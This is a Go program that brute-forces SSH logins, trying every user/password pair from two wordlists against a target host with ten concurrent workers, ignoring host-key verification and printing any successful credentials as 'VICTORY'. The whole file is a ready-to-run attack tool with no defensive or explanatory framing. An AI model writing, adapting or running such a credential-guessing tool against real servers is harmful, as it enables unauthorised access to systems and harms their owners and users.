package main

import (
	"bufio"
	"fmt"
	"os"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

type Credential struct {
	User string
	Pass string
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: go run main.go <target:port> <user_list> <pass_list>")
		fmt.Println("Example: go run main.go 192.168.1.50:22 users.txt passwords.txt")
		os.Exit(1)
	}

	target := os.Args[1]
	userFile := os.Args[2]
	passFile := os.Args[3]

	users, err := readLines(userFile)
	if err != nil {
		fmt.Printf("Error reading users file: %v\n", err)
		os.Exit(1)
	}

	passwords, err := readLines(passFile)
	if err != nil {
		fmt.Printf("Error reading passwords file: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("[*] Attack started on %s\n", target)

	jobs := make(chan Credential, 100)
	var wg sync.WaitGroup

	for i := 0; i < 10; i++ {
		wg.Add(1)
		go worker(target, jobs, &wg)
	}

	go func() {
		for _, u := range users {
			for _, p := range passwords {
				jobs <- Credential{User: u, Pass: p}
			}
		}
		close(jobs)
	}()

	wg.Wait()
	fmt.Println("\n[*] Attack Finished")
}

func worker(target string, jobs chan Credential, wg *sync.WaitGroup) {
	defer wg.Done()

	for cred := range jobs {
		config := &ssh.ClientConfig{
			User: cred.User,
			Auth: []ssh.AuthMethod{
				ssh.Password(cred.Pass),
			},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			Timeout:         3 * time.Second,
		}

		conn, err := ssh.Dial("tcp", target, config)
		if err == nil {
			fmt.Printf("\n[+] VICTORY %s | %s\n", cred.User, cred.Pass)
			conn.Close()
			return
		}
	}
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}
